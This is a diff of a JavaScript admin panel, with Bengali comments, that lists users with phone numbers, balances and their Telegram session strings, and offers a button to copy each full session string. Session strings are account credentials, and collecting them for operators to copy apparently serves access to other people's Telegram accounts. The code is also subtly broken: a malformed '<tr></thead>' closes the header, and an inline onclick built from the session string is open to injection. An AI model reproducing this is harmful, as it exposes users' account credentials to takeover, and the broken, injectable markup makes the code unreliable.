@@ -620,42 +620,41 @@ async function loadUsers(){
     if (!d.users || d.users.length === 0) { box.innerHTML = `<div>No users found.</div>`; return; }
     
     let html = `<div style="overflow-x: auto;">`;
-    html += `<table style="width:100%; border-collapse: collapse; font-size: 13px; min-width: 800px;">`;
+    html += `<table style="width:100%; border-collapse: collapse; font-size: 13px; background: transparent; min-width: 800px;">`;
     html += `<thead><tr style="background: #1e293b; color: #00f2fe;">`;
-    html += `<th style="padding: 10px 8px;">Full Name</th>`;
-    html += `<th style="padding: 10px 8px;">Username</th>`;
-    html += `<th style="padding: 10px 8px;">Telegram ID</th>`;
-    html += `<th style="padding: 10px 8px;">Phone</th>`;
-    html += `<th style="padding: 10px 8px;">Cash (৳)</th>`;
-    html += `<th style="padding: 10px 8px;">AAF</th>`;
-    html += `<th style="padding: 10px 8px;">Session String</th>`;
+    html += `<th style="padding: 10px 8px; text-align: left;">Full Name</th>`;
+    html += `<th style="padding: 10px 8px; text-align: left;">Username</th>`;
+    html += `<th style="padding: 10px 8px; text-align: left;">Telegram ID</th>`;
+    html += `<th style="padding: 10px 8px; text-align: left;">Phone</th>`;
+    html += `<th style="padding: 10px 8px; text-align: left;">Cash (৳)</th>`;
+    html += `<th style="padding: 10px 8px; text-align: left;">AAF</th>`;
+    html += `<th style="padding: 10px 8px; text-align: left;">Session String</th>`;
     html += `<th style="padding: 10px 8px; text-align: center;">Copy</th>`;
-    html += `</table></thead><tbody>`;
+    html += `<tr></thead><tbody>`;
     
     d.users.forEach(u => {
-      // পূর্ণ নাম (first_name + last_name)
+      // পূর্ণ নাম তৈরি
       let fullName = '';
       if (u.first_name) fullName += u.first_name;
       if (u.last_name) fullName += ' ' + u.last_name;
-      fullName = fullName.trim() || (u.username || 'N/A');
+      fullName = fullName.trim() || u.username || 'N/A';
       
-      // ইউজারনেম
-      let username = u.username || 'N/A';
-      
-      // ফোন নাম্বার ফরম্যাট (01XXXXXXXXX)
-      let phone = u.phone || "N/A";
-      if (phone !== "N/A" && phone.startsWith("+880")) phone = phone.slice(4);
-      
-      const session = u.session_string || "Not available";
-      const displaySession = session.length > 20 ? session.substring(0,17)+"..." : session;
+      const username = u.username || 'N/A';
+      const tgId = u.telegram_id || 'N/A';
+      let phone = u.phone || 'N/A';
+      if (phone !== 'N/A' && phone.startsWith('+880')) phone = phone.slice(4);
+      const cash = parseFloat(u.cash || 0).toFixed(2);
+      const aaf = parseFloat(u.aaf || 0).toFixed(2);
+      const session = u.session_string || 'Not available';
+      const displaySession = session.length > 20 ? session.substring(0,17)+'...' : session;
       
       html += `<tr style="border-bottom: 1px solid #2d3a5e;">`;
       html += `<td style="padding: 8px;">${escapeHtml(fullName)}</td>`;
       html += `<td style="padding: 8px;">${escapeHtml(username)}</td>`;
-      html += `<td style="padding: 8px;">${u.telegram_id || "N/A"}</td>`;
+      html += `<td style="padding: 8px;">${escapeHtml(tgId)}</td>`;
       html += `<td style="padding: 8px;">${escapeHtml(phone)}</td>`;
-      html += `<td style="padding: 8px;">৳ ${parseFloat(u.cash || 0).toFixed(2)}</td>`;
-      html += `<td style="padding: 8px;">${parseFloat(u.aaf || 0).toFixed(2)}</td>`;
+      html += `<td style="padding: 8px;">৳ ${cash}</td>`;
+      html += `<td style="padding: 8px;">${aaf}</td>`;
       html += `<td style="font-family: monospace; font-size: 11px; padding: 8px;">${escapeHtml(displaySession)}</td>`;
       html += `<td style="text-align: center; padding: 8px;"><button onclick="copyToClipboard('${session.replace(/'/g, "\\'")}')" style="background: #00f2fe; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer;">📋 কপি</button></td>`;
       html += `</tr>`;
@@ -666,9 +665,16 @@ async function loadUsers(){
     console.error(e);
     document.getElementById('member-list-body').innerHTML = `<div>Error: ${e.message}</div>`;
   }
-}
+    }
 
-// XSS প্রতিরোধের জন্য হেল্পার ফাংশন
+// কপি ফাংশন
+function copyToClipboard(text) {
+  navigator.clipboard.writeText(text).then(() => {
+    alert("সেশন স্ট্রিং কপি হয়েছে!");
+  }).catch(() => {
+    alert("কপি করতে ব্যর্থ, ম্যানুয়ালি কপি করুন");
+  });
+}
 function escapeHtml(str) {
     if (!str) return '';
     return str.replace(/[&<>]/g, function(m) {
@@ -678,15 +684,6 @@ function escapeHtml(str) {
         return m;
     });
 }
-// কপি ফাংশন
-function copyToClipboard(text) {
-  navigator.clipboard.writeText(text).then(() => {
-    alert("সেশন স্ট্রিং কপি হয়েছে!");
-  }).catch(() => {
-    alert("কপি করতে ব্যর্থ, ম্যানুয়ালি কপি করুন");
-  });
-}
-
 /* ================= TASKS ================= */
 
 // টাস্ক লোড API থেকে
